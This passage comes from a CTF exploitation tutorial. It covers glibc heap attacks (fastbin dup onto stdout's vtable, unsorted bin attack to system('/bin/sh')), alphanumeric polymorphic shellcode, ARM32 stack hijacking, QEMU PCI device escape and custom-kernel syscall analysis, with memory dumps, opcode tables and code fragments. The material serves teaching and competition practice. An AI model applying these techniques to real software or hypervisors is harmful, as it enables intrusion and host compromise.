0x7ffff7bc4620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffff7bc46a3
0x7ffff7bc4630 <_IO_2_1_stdout_+16>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4640 <_IO_2_1_stdout_+32>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4650 <_IO_2_1_stdout_+48>:    0x00007ffff7bc46a3      0x00007ffff7bc46a3
0x7ffff7bc4660 <_IO_2_1_stdout_+64>:    0x00007ffff7bc46a4      0x0000000000000000
0x7ffff7bc4670 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7bc4680 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7bc38e0
0x7ffff7bc4690 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7ffff7bc46a0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007ffff7bc5780
0x7ffff7bc46b0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
0x7ffff7bc46c0 <_IO_2_1_stdout_+160>:   0x00007ffff7bc37a0      0x0000000000000000
0x7ffff7bc46d0 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc46e0 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
0x7ffff7bc46f0 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7bc26e0 <== vtable's address
```

As you can see, if we want to do this we must do allocation no more at `0x7ffff7bc46f8`. Fine, but we have an interesting value at `_codecvt` field at `0x7ffff7bc46c0`. What if we look at this layout with small *"shifting"* of target address?

```
gef➤  x/30gx 0x7ffff7bc46bd
0x7ffff7bc46bd <_IO_2_1_stdout_+157>:   0xfff7bc37a0000000      0x000000000000007f
0x7ffff7bc46cd <_IO_2_1_stdout_+173>:   0x0000000000000000      0x0000000000000000
0x7ffff7bc46dd <_IO_2_1_stdout_+189>:   0x00ffffffff000000      0x0000000000000000
0x7ffff7bc46ed <_IO_2_1_stdout_+205>:   0x0000000000000000      0xfff7bc26e0000000 <== vtable's address ending
0x7ffff7bc46fd <_IO_2_1_stdout_+221>:   0xfff7bc454000007f      <== vtable's address beginning
```

So, right at `0x7ffff7bc46bd` we have absolutely **valid header of chunk** with size `0x70` (including `0x10` bytes of header) and flags `PREV_INUSE | IS_MAPPED | NOT_MAIN_ARENA` (`0x7f = 0b0b1111111`). If `PREV_INUSE` set we can have data (of previous chunk) which overwrite `prev_size` field of chunk header.

And via fastbin dup:

```
0x555555a021c0: 0x0000000000000000      0x0000000000000071
0x555555a021d0: 0x00007ffff7bc46bd      0x0000000000000000
            ...
0x555555a02260: 0x0000000000000000      0x0000000000000071
0x555555a02270: 0x0000555555a021c0      0x0000000000000000
```

The next (3rd after `fd` overwrite) `malloc( <0x60 - 0x68> )` returns `0x7ffff7bc46cd` which will help us to overwrite vtable pointer of stdout.

---

### 6.12 Unaligned malloc size to potentially off-by-one

When you call `malloc(X)`, `X` will be aligned to `0x10` bytes and `0x10` bytes will be added to this value and you'll get the `"size"` field. But what is a side of alignment? It depends on `X`. If you put value which has low nibble which less or equal to `0x8`, allocator will align it downward and you'll get a way to fill `"prev_size"` field of the next chunk. For example:

This is what you can fill with `malloc(0x18)`:

```
0x603020:       0x0000000000000000      0x0000000000000021
0x603030:       0x6161616161616161      0x6161616161616161
0x603040:       0x6161616161616161      0x0000000000000101 <== potentially off-by-one
```

If a process does something like *"put null byte after reading/copying"* (`sprintf`, `strcpy` for example) you can overwrite `"size"` field and get a way to reach overlapping chunks or something else (topchunk size control).

---

### 6.13 malloc_consolidate()

When process uses functions such as `localtime()` or another wich requires large chunk to store `_IO_FILE_plus` or smth else glibc allocator can trigger `malloc_consolidate` to clear fastbins via movement all chunks from there to the **unsorted bin**. It means that you probably miss fastbin dup via double-free / fastbin poisoning via uaf because when upper functions will be called `fd` / `bk` of chunks will be overwitten by main_arena addresses. And it actually has two sides.

I faced with it during solve `CAOV` from pwnable.tw. That was the first time when I decided to up `2.23ubuntu5` environment because binary required `libstdc++` & `libgcc_s` & `libm`.

So, when I tried to do fastbin poisoning via uaf and called function which called `localtime()`, allocator tried to move evil chunk to unsorted bin and fell because it didn't find properly header of the down chunk. Debug has taken 2 days and I decided to find another way to solve chall. And not just fall back ant try to find another way to get arbitrary write primitive - I tried to use `malloc_consolidate` **against itself**.

That function takes all sizes to unsorted bin and that means I can move evil chunk to `smallbins[4]` (address `+ 0x68` from `unsorted_chunks` <=> `__chain` of FILE) with my fake `_IO_FILE_plus` struct and via **unsorted bin attack** overwrite `_IO_list_all` to `unsorted_chunks`. And via triggering `__overflow` (`write_ptr > write_base`) got a `system( _flags )` from fake_vtable where `_flags = b'/bin/sh\x00'`.

But if you work with newer versions of libc (`2.24 <=` when vtable_validate or `2.29 <=` when unsorted bin patched) you can find another vector to pwn it. For example - **smallbin attack** or **largebin attack** after unsorted unlink or any tricky way with tcache.

So, after 3.5 days of brainstorm with `malloc_consolidate` I understand that my environment was a bit *"incorrect"* xD. Binary from server had another logic of localtime as I know - it didn't trigger `malloc_consolidate` almost at all and solution was much easier.

---

### 6.14 Polymorphic shellcode (i386)

So, I'm not sure that you can be faced with this case at new tasks but I was faced and I can't don't explain it :) At the `"alive_note"` task from pwnable.tw any data sections (including heap) were executable but so strong *"firewall"* was. I can put only **"alnum symbols"** (english alphabet `a-z` `A-Z` and printable digits `0x30-0x31`) and space `0x20`. Btw, exist `"death_note"` yet where filter passes only printable symbols, but it's more soft. It means that I have **very small set of opcodes** which would help to build shellcode. So, I had to do the **polymorphic shellcode** which will transforms itself during execution to bypass filter to get such opcodes as `pop ebx` and `int 0x80` and `'/bin/sh\x00'` at the stack and other useful values. In similar case operations like `push`/`pop` & `inc`/`dec` & `xor`/`end` are you **best friends**.

Here are a couple of my advices:

1. Use `esp` to handle the stack via `push esp; pop ecx`
2. Save zeros to set arguments `ecx` & `edx` to zero
3. Use `je`/`jne` if you can put only separated shellcode
4. Look around. Already exist opcodes like `0x00` maybe aren't malicious to your shellcode
5. You can get almost any value via `XOR` (`[reg + offs] ^ reg`)
6. Negative values can be useful with `XOR` (just `dec`)
7. If you have large space to shellcode don't be afraid from a lot `"inc"`/`"dec"`
8. Via `"stack"` pointer (`ecx`) make stack grooming to get what you need
9. You must find a something **"base"** pointer which helps you to `XOR` opcodes to bypess filter

Here are some opcodes which are **"alnum symbols"**:

| Opcode | Instruction |
|--------|-------------|
| `50` | `push eax` |
| `58` | `pop eax` |
| `51` | `push ecx` |
| `59` | `pop ecx` |
| `52` | `push edx` |
| `5a` | `pop edx` |
| `54` | `push esp` |
| `49` | `dec ecx` |
| `41` | `inc ecx` |
| `4a` | `dec edx` |
| `43` | `inc ebx` |
| `4b` | `dec ebx` |
| `66 31 50 68` | `xor WORD PTR [eax+0x68], dx` |
| `30 50 41` | `xor BYTE PTR [eax+0x41], dl` |
| `20 59 41` | `and BYTE PTR [ecx+0x41], bl` (if space is valid sym) |
| `68 5a 5a 73 68` | `push 0x68735a5a` |
| `68 5a 62 69 6e` | `push 0x6e69625a` |
| `74 41` | `je + 0x41` |
| `75 41` | `jne + 0x41` |

## NON-STANDART ARCHITECTURES AND ANOTHER INTERESTING THINGS

I decided include this topic here so you can find out any specific-things and don't waste time when you'll be faced with it at the first time.

---

### 7.1 PWNING ON ARM32 ARCH

Overall ARM and x86 archs are doing the same things but *"under another shells"*.

First of all you have to install utilities for debug. I advice donwloading `qemu-arm` & `gdb-multiarch` with necessary dependencies. Gef framework is compatible with this gdb.

To start process for debugging use:

```
qemu-arm -g <port> <proc>
```

And to attach to process:

```
gdb-multiarch <proc>
target remote 127.0.0.1:<port>    (if you're debugging locally)
```

Well done. And then you can communicate with it via terminal with opened gdb.

**1. Registers:**

- `r0-r3` : these registers are used as arguments for functions. Just like `rdi`, `rsi`, `rdx`, `rcx`.
- `r4-r10` : these registers are callee-saved for any variables. They must be saved in the stack if process want to change them. Like `rbx`, `rbp`, `r8-r15`.
- `r11` aka `fp` : frame pointer. Just like `rbp`.
- `r12` aka `ip` : intra-procedure call. This register used to save addresses of functions when dynamic linker works.
- `r13` aka `sp` : just stack pointer like `rsp`.
- `r14` aka `lr` : link register. Specific for ARM. It used to save address there function has to returns. Process can handle it with special instructions but usually it's doing return via stack.
- `r15` aka `pc` : program counter. Keeps address of current instruction. Like `rip`, but when proc try doing something like *"rip relative"* buf with `ps`, it using `pc + 8`.
- `cpsr` : current program status register. Including flags and another meta.

**2. Some instructions:**

*Load register:*

```
ldr    r3, [pc, #148]  - take address at the $pc (specifically for $pc additionaly add 8) + 148
                         and put data at this address to $r3

ldr    r3, [r3, #4]    - more common example - take address at $r3, plus 4 and put data there to $r3
```

*Store register:*

```
str    r3, [r11, #-16] - put $r3 to address at $r11 - 16
```

*Branch:*

```
b      <mark>          - unconditional jump to mark. Analog of jmp

bl     <mark>          - jump to mark and put address of the next instruction to the $lr. Analog of call

bx     lr              - jump to address in register. Just like jmp rax.

beq/bne/bgt/... <mark> - conditional jumps. Determined by $cpsr with flags like in x86.
```

*Stack handle:*

```
push   {r11, r12, lr, pc}    - push registers onto the stack.
                               Their placement depends on their "system odrer" (11 -> 12 -> 14 -> 15)

pop    {r0, pc}              - pop 2 args from the top of the stack to registers.
                               firstly $r0 and then $pc (just like in push)

ldmfd  sp, {r4, r11, sp, pc} - load multiple, full descending.
                               1st arg $sp - pointer where parse data.
                               2nd arg {r4, ..., pc} - where load parsed data.
                               So $r4 becomes [$sp + 0x0], $r11 - [$sp + 0x4]
```

**3. How to hijack control via stack:**

A lot of people are still thinking that binary pwn is just buffer overflow xd. ... but now we actually will discuss about it :) because it's basic.

So, you just need overwrite data under the `$sp` to the moment of calling of the `ldmfd` instruct. If that instruction has signature like at the example you have to oriented on 2 last registers to control stack pointer & progtam counter. But you have to do care about ROP location, because with `$r4`, `$r11` and `$pc`, `$sp` also will be changed. It means that you need also control future `$sp` in stack or consider location of ROP with new `$sp`.

I advice you to try to solve task from **LineCTF 2022** - `"simbox"`, according this topic. You can find binary and solution there: https://github.com/sayhi13/CTF-writeups/tree/main/simbox

---

### 7.2 QEMU ESCAPE

QEMU - Quick Emulator for emulation of virtual OS. It means it's mapping all content of operation system with *"hardware"* to it own virtual memory. And here we'll look at a realization of PCI (Peripheral Component Interconnect) device aka in the qemu. So qemu is a just binary `qemu-system-x86_64` with dependencies such as `bios` dir & `bzImage`. *p.s.* binary is executing on the native os so in knows about it's filesystem (concept of qemu escape).

And first of all we'll consider model of memory. It includes 4 key defenitions:

- **GVA - Guest Virtual Address:** There are just addresses of guest process virtual space. It includes code pages, libraries pages, linker pages, heap/stack, mapped pages etc.
- **GPA - Guest Physical Address:** There is mapping of GVA to the physical RAM. So it's just addresses of you virtual pages in the RAM stick (obviously, in emulation via mmap). And later we'll consider how to determine GPA via GVA.
- **HVA - Host Virtual Address:** There are virtual addresses of pages of binary `qemu-system-x86_64`. And this binary also handle with GPA. So it basically place new guest processes into the emulation of physical pages. Host (qemu binary) thinks that it's a native system with hardware etc. But it just an emulation inside of your real native system.
- **HPA - Host Physical Address:** Finally, this is physical addresses in real physical RAM sticks. Without emulations. Your native os places qemu binary into the RAM and mapped it with HVA.

It's something like so:

```
[ native OS ]   - knows about HPA
      |
  [ QEMU ]      - knows about HVA
      |
[ subsystem ]   - thinks that it's native os and knows about GPA
      |
 [ process ]    - knows about it's own GVA
```

Alright. Now we have to know how PCI device was deployed:

1. Initialization of types, memory region, callbacks etc.
2. Realize of device - bind vendor ID, device ID, and other meta.
3. Subsystem scans PCI bus and finds there our device.
4. Subsystem does allocation of device to the GPA.
5. QEMU hooks this allocation and rebuilds fields in device's memory region for appropriation.

And after these manipulation we got a deployed PCI device with their own GPA. It meand that we can interact with it via it's GPA.

For example, if device's GPA is `0xfebd0000`, any read/write at `0xfebd0000 + offset` will trigger it to do something which determined in callbacks.

Now we look at the example - `"Wall Maria"` from HITCON 2023. We'll skip part of init functions so they just fill meta for qemu.

Class init:

```c
static void maria_class_init(ObjectClass *class, void *data) {
    DeviceClass *dc = DEVICE_CLASS(class);
    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);

    k->realize = pci_maria_realize;
    k->vendor_id = PCI_VENDOR_ID_QEMU;
    k->device_id = 0xDEAD;
    k->revision = 0x0;
    k->class_id = PCI_CLASS_OTHERS;

    set_bit(DEVICE_CATEGORY_MISC, dc->categories);
}
```

Right there we're filling up fields to know how to find module in subsystem (via device ID).

MemoryRegionOps init:

```c
static const MemoryRegionOps maria_mmio_ops = {
    .read = maria_mmio_read,          /* signature of callbacks */
    .write = maria_mmio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid = {
        .min_access_size = 4,
        .max_access_size = 4,
    },
    .impl = {
        .min_access_size = 4,
        .max_access_size = 4,
    },
};
```

This is a structure which determines callbacks, endianness & how much we can read/write.

```c
static void pci_maria_realize(PCIDevice *pdev, Error **errp) {
    MariaState *maria = MARIA(pdev);
    memory_region_init_io(&maria->mmio, OBJECT(maria), &maria_mmio_ops, maria, "maria-mmio", MARIA_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &maria->mmio);
}
```

And right there we bind upper struct to device.

Signature of state structure:

```c
typedef struct {
    PCIDevice pdev;
    struct {
        uint64_t src;
        uint8_t off;
    } state;
    char buff[BUFF_SIZE];
    MemoryRegion mmio;
} MariaState;
```

As we can see, here we have `PCIDevice` & `MemoryRegion` struct fields. The first of them includes a lot of meta for properly module working. And the second stores severeal key structures for exploitation, including `MemoryRegionOps`, `opaque` etc.

Let's look at the one of callbacks:

```c
static uint64_t maria_mmio_read(void *opaque, hwaddr addr, unsigned size) {
    MariaState *maria = (MariaState *)opaque;
    uint64_t val = 0;
    switch (addr) {
        case 0x00: ...
        case 0x04: ...
        case 0x08: ...
        default: ...
    }
    return val;
}
```

- `opaque` - just pointer to `MariaState` struct. It will be throw to the 1st arg for each *"trigger"*.
- `hwaddr` - as we discuss, when we read/write at the `< base GPA > + offset`, `hwaddr` if an offset. and we can do read/write 32 bits only because `.min/max_access_size = 4`.
- `size` - how many bytes we want to read/write.

write callback includes one more argument - `uint64_t val`. It's a value which we want to write. For example:

```c
*(volatile uint32_t*)(module_base + 0x4) = (uint32_t)0x10;
```

`hwaddr` - `0x4` & `val` - `0x10` & `size` - `0x4`.

And let's check one more important function:

```c
cpu_physical_memory_rw(maria->state.src, &maria->buff[maria->state.off], BUFF_SIZE, 1);
```

This function does stuff like `memcpy`, `buf` with several extras:

- 4th arg determines what to do? (0 - write / 1 - read)
- if read: 1st arg is destination (read to), 2st arg is source (read from)
- if write: 1st arg is source (write from), 2st arg is destination (write to)
- and 3rd arg if how many bytes to copy

And the 1st argument must be GPA of buffer of a process which interact with PCI device. So 2nd argument is the HVA of PCI device (not GPA because PCI device works in the qemu binary).

Well done. Now we should know how we can communicate with PCI device. And we have 2 variants: userscape application or kernel module.

I explain you the first one:

1. Firstly we have to find symlink of PCI device with command:

```
lspci -n     - show vendor ID & device ID
```

output:

```
00:05.0 Class 00ff: 1234:dead    <== after indentification we interested at the first field
```

2. Determine symlink with:

```
ls -l  /sys/bus/pci/devices | grep 00:05.0
```

output:

```
lrwxrwxrwx    1 root     root             0 Sep 27 12:28 0000:00:05.0 -> ../../../devices/pci0000:00/0000:00:05.0
```

it means that device exists and final symlink for application is:

```
/sys/bus/pci/devices/0000:00:05.0/resource0
```

3. Just open it:

```c
dev_fd = open(DEVICE_PATH, O_RDWR)
```

4. And map it to GVA of app:

```c
dev_mmap_ptr = (volatile uint8_t*)mmap(NULL, DEVICE_MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, 0)
```

Congratulations. We mapped PCI device GPA to the userspace app GVA. It means that base GPA of device was bound on `mmap` return address. And now we can read/write via this address to trigger callbacks. This concept called **MMIO - Memory Mapping I/O**.

How to translate GVA to GPA:

1. Process must be started as root
2. Open `/proc/self/pagemap` (this is a large file with meta of phys. addresses 8 bytes per page)
3. Calculate offset at this file via GVA:

```
page_idx = GVA >> 12
page_off = GVA & 0xfff
```

4. Find appropriate writing at the file:

```
lseek(fd, page_idx * 8, SEEK_SET) - offset equals the 2nd arg
```

5. Extract 8 bytes
6. Check is page exists in RAM via the highest bit (if it isn't - page wasn't loaded):

```
entry >> 63 == 1
```

7. Get Page Frame Number:

```
entry &= 0x7fffffffffffffff
```

8. Calculate physical address via `PFN * PAGE_SIZE + OFFSET`:

```
(entry << 12) | page_off
```

I hope you understand that OS can allocate adjacent virtual pages with not adjacent physical pages. And in some context knoweledge about how do allocate adjacent phys pages can be useful, because PCI devices can handle with several pages instead of one. And if you calculated GPA for the first virtual page as base, they couldn't be adjacent in RAM stick. It means that if you want to write data from userspace buffer to the PCI device buffer, device will read data from RAM (or RAM emulation like qemu) with GPA with `0x3000` bytes for example, so if you aren't sure that pages adjacent in RAM, device may read your data from the 1st page and then read garbage from next adjacent physical page which isn't adjacent to your virtual page.

So you have to just allocate pages with `mmap` with flag `MAP_POPULATE` to load it in RAM immediately untill their PFN won't be different at one (`first_page_pfn + 1 == second_page_pfn`). And despite the flag `MAP_POPULATE` I advice you also fill that pages with any data to be sure that if pages were't loaded in RAM, page fault was called to load them.

Before we'll figure out with exploitation we should understand how to debug it. It isn't so hard. We just have to do ptrace with gdb on qemu binary from native system (native os or docker for example):

1. Start qemu with: `./run.sh`
2. Attach with: `gdb -p $(pgrep qemu-system)`

Here we are. Now you can do `info proc mappings` (or `vmmap` under GEF), set breakpoints and other.

And after all of these discussion we finally can look at the potential exploitation targets:

**1) MemoryRegion:**

As I wrote upper, it field stores very useful data such as parent object, flags, owner and high-attention fields - `ops` and `opaque`:

```c
mmio = {
  parent_obj = {
    class = 0x55923630b3b0,
        ...
  },
      ...
  readonly = 0x0,
  nonvolatile = 0x0,
  rom_device = 0x0,
      ...
  owner = 0x55923725ef30,
  ops = 0x55920edc1f80 <maria_mmio_ops>,    /* struct with callbacks */
  opaque = 0x55923725ef30,                  /* pointer to MariaState struct */
      ...
}
```

**2) MemoryRegionOps:**

You can find signarure of this structure upper, when we studied key structure and functions. Usually this structure situated in the heap so it writeable. It means that if you overwrite callbacks you'll can transfer the control flow with controlling of arguments - `$rdi` is `opaque`, `$rsi` is `hwaddr`, `$rsi` is `val` (or `size`, depends on what callback we're exploiting).

**3) opaque:**

If you overwrite this field you'll can potentially compromise full system, but you should be pretty careful because `pdev` struct includes very lot of fields (almost `mmio` struct, but it includes fewer fields) and to do type confusion you have to place new fake `opaque` in known address and substitute original. It has large impact (you control all fields & callbacks) but can be expensive. You also can `opaque` overwrite to control the `$rdi` as the 1st arg of substituted callback.

**4) seccomp:**

This is a secure concept which allows only necessary syscalls. It actually means: *"Everything that isn't expressly permitted is prohibited"*. And you probably won't be able to use `execve` / `fork` / `socket` and other things. It means that you have to use **ORW primitive** to read the flag.

I advice you to solve Wall Maria task to improve your qemu-escape skills. You can find source & solution at https://github.com/wxrdnx/HITCON-2023-Challenges/tree/main/wall-maria and my exploit at https://github.com/sayhi13/CTF-writeups/tree/main/wall_maria

---

### 7.3 CUSTOM KERNELS

While I storlled at Internet I faced with interest task wich included fully-custom kernel arch based on linux. So now we'll consider several important topics for solving, debugging, finding of vulns and another key things etc.

**1) syscall and kernel mode:**

My task has specific so it can execute raw bytes code. Kernel determines standart ASM-x86_64 opcodes and all of these mean that I need to use syscalls. When process uses syscall it's `RIP` migrates to the kernel space immediately and kernel saves user-mode's context. Then we go to execute code which handles syscall.

Syscall handler stores in special `$LSTAR` register but not always lstar determines in gdb (or that's just my fault). Anyway you can do signature analysis to find this callback and do syscall-numbers traversal. Let's check it out:

```
000:FFFFFF800002170C                     align 10h               ; syscall
seg000:FFFFFF8000021710                 mov     cs:qword_FFFFFF8000022268, rsp    /* save rsp */
seg000:FFFFFF8000021717                 mov     rsp, 0FFFFFF8000007000h           /* migrate rsp to kernel stack */
seg000:FFFFFF8000021721                 mov     cs:qword_FFFFFF8000022230, rax    /* save remainder registers */
    ...
seg000:FFFFFF8000021791                 mov     cs:qword_FFFFFF80000222B8, r11
seg000:FFFFFF8000021798                 call    do_stuff                          /* call main handler */
seg000:FFFFFF800002179D                 mov     rax, cs:qword_FFFFFF8000022230    /* restore context */
    ...
seg000:FFFFFF8000021806                 mov     r11, cs:qword_FFFFFF80000222B8
seg000:FFFFFF800002180D                 sysret                              /* back to user space */
```

It means that `0xFFFFFF800002170C` is base address of syscall (`RIP` migrates here and `RSP` also migrate to kernel space). If you find it *"with your hands"* you should try to find blocks with storing/restoring registers.

**2) main syscall handler:**

Upper example proofed that `do_stuff` is the main handler. Let's look at this:

```
000:FFFFFF80000211A0 do_stuff         proc near               ; CODE XREF: seg000:FFFFFF8000021798↓p
seg000:FFFFFF80000211A0                 push    rbp          /* save prev sfp */
seg000:FFFFFF80000211A1                 mov     rbp, rsp     /* save spf */
seg000:FFFFFF80000211A4                 push    r15          /* save regs */
    ...
seg000:FFFFFF80000211AD                 push    rax
seg000:FFFFFF80000211AE                 mov     r12, 0FFFFFF8000022230h      /* get address of syscall number */
seg000:FFFFFF80000211B8                 mov     rbx, [r12]                  /* store it to rbx */
   <some logic>
seg000:FFFFFF8000021202                 cmp     rbx, 3                       /* compare rbx with the largest valid syscall number */
seg000:FFFFFF8000021206                 ja      short loc_FFFFFF800002121E   /* fault handler */
seg000:FFFFFF8000021208                 mov     rax, 0FFFFFF80000220B0h      /* rax == base of syscall table */
seg000:FFFFFF8000021212                 mov     rdi, r14
seg000:FFFFFF8000021215                 mov     rsi, r15
seg000:FFFFFF8000021218                 call    qword ptr [rax+rbx*8]        /* do stuff with calculated address */
seg000:FFFFFF800002121B                 mov     rsi, rax
seg000:FFFFFF800002121E
seg000:FFFFFF800002121E loc_FFFFFF800002121E:                             /* finish */
seg000:FFFFFF800002121E                 mov     [r12], rsi
seg000:FFFFFF8000021222                 mov     rdi, 0FFFFFF8000023126h
seg000:FFFFFF800002122C                 xor     eax, eax
seg000:FFFFFF800002122E                 mov     rcx, r13
seg000:FFFFFF8000021231                 add     rsp, 8
    ...
seg000:FFFFFF800002123E                 pop     rbp
seg000:FFFFFF800002123F                 jmp     rcx
seg000:FFFFFF800002123F do_stuff        endp
```

As you can see, firstly it checked syscall number to filter bad numbers immediately. Then it uses special syscall table to reach appropriate handler. Look at this:

```
seg000:FFFFFF80000220B0                 dq 0FFFFFF8000020FD0h, 0FFFFFF8000021050h
seg000:FFFFFF80000220C0                 dq 0FFFFFF80000210D0h, 0FFFFFF8000021130h
```

Alright, 4 valid syscalls.

**3) concrete syscall:**

Very big chance that you can't determine fast where are base syscall, main handler and concrete syscall handlers (if you aren't use AI ofc) but don't worry about it - it's normal. Especially when you do this at the first time. So concrete syscalls have similar specific opcodes which provide the *"pipe"* between user and kernel spaces and we may detect them without problems:

```
syscall 0 :

FFF8000020FD0 read_from_com   proc near
seg000:FFFFFF8000020FD0                 cmp     rdi, 401000h
    <some logic>
seg000:FFFFFF800002100B                 stac                   /* HERE allow kernel use user stack */
    <some logic>
seg000:FFFFFF8000021030
seg000:FFFFFF8000021030 loc_FFFFFF8000021030:                   ; CODE XREF: read_from_com+6D↓j
seg000:FFFFFF8000021030                 call    r12 ; sub_FFFFFF8000020D70    /* some stuff */
    <some logic>
seg000:FFFFFF800002103F
seg000:FFFFFF800002103F loc_FFFFFF800002103F:                   ; CODE XREF: read_from_com+41↑j
seg000:FFFFFF800002103F                 clac                   /* HERE disallow kernel use user stack */
seg000:FFFFFF8000021042                 mov     rax, rbx
seg000:FFFFFF8000021045                 pop     rbx                    /* restore regs */
    ...
seg000:FFFFFF800002104C                 pop     rbp
seg000:FFFFFF800002104D
seg000:FFFFFF800002104D locret_FFFFFF800002104D:                ; CODE XREF: read_from_com+2B↑j
seg000:FFFFFF800002104D                 retn
seg000:FFFFFF800002104D read_from_com   endp
```

As you can see, if kernel interacts with userspace it need to get access to read/write at user space. And you can easily determine kernel syscalls with this signature.

More several markers which indicates that process transfer control from user to kernel:

- `swapgs` - change `$gs` reg to kernel context
- `iretq`/`sysexit` - another way to return to userspace (but you have to control another ret-struct)
- `modprobe_path` - path to program which load `.ko` modules

**4) find vulnerability:**

```
seg000:FFFFFF800002112B                 align 10h
seg000:FFFFFF8000021130                 mov     rax, 0FFFFFFFFFFFFFFEAh ; copy_from_user
    ...
seg000:FFFFFF8000021166                 stac                 /* disable smap temporary */
seg000:FFFFFF8000021169                 mov     rax, 0FFFFFF8000022230h /* HERE we load address of $cs where saved registers store */
    ...
; memcpy preparation
seg000:FFFFFF800002117D                 mov     edx, 90h             /* how many bytes copy */
seg000:FFFFFF8000021182                 mov     rsi, rdi             /* src */
seg000:FFFFFF8000021185                 mov     rdi, rax             /* now dest is $cs without the 1st qword */
seg000:FFFFFF8000021188                 call    rcx ; sub_FFFFFF8000021250
seg000:FFFFFF800002118A                 clac                 /* enable smap */
    ...
seg000:FFFFFF800002119D                 retn
```

*p.s.* SMAP is Supervisor Mode Access Prevention. If this mode set any try to read/write at the userspace will calls page fault in kernel and crush system. Btw SMEP is Supervisor Mode Execution Prevention - if smep's bit set process in kernel mode can't execute user space instructions.

It means that you can control stored registers including furure `rip` via `rcx` and `rflags` via `r11` (after syscall kernel stores return address and rflags, which used at sysret, at the `rcx` and `r11`).

**5) How to debug it:**

1. Use `gdb-multiarch` with `vmlinux` if you have it or debug binary without debug symbols
2. Basically set breakpoints where you need but be careful at the moment when kernel transfers control to user via `sysret` and user go to the kernel via `syscall`. I advise to use `"stepi"` & `"si"` at those opcodes when breakpoints already set.
3. Use default commands like `"x/10gx addr"` to memory walk etc.
4. Write simple scripts to bypass hand input for each deploy for debugging like this:

```python
import gdb

regs = ["rax", "rdi", "rsi", "rbx", "rcx", "rdx", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

# 0 - read, rdi - dst, rsi - count
# 1 - write, rdi - src, rsi - count
# 2 - copy from kernel, rdi - dst, rsi - count (always 0x90)
# 3 - copy to kernel, rdi - src, rsi - count (0x90)

def ex(command):
    gdb.execute(command)

ex("b *0xffffff8000020b25")
ex("c")

ex("set *0x400000 = 0x0f")
ex("set *0x400001 = 0x05")

ex("set {char[11]}0x401000 = \"./image.bin\"")

ex("b *0x400000")
ex("si")
ex("b *0xffffff80000211fb")

for reg in regs:
    ex(f"set ${reg} = 3")

ex("set $rdi = 0x401000")
ex("set $rsi = 0x90")
```

*p.s.* you'll have to cludge with a high probability because debugging of custom kernel not basic problem so you can see what I manually wrote opcode of syscall and other things I did manually because gdb didn't work correct with my task.

And here we are :) With these knowledges you won't waste you time if you'll be faced with custom kernel tasks at the 1st time unlike me xd.

---

And don't forget: *"control is an illusion, but a very useful one"*. So, that's all at this time. Now you are on your own. Good luck :)
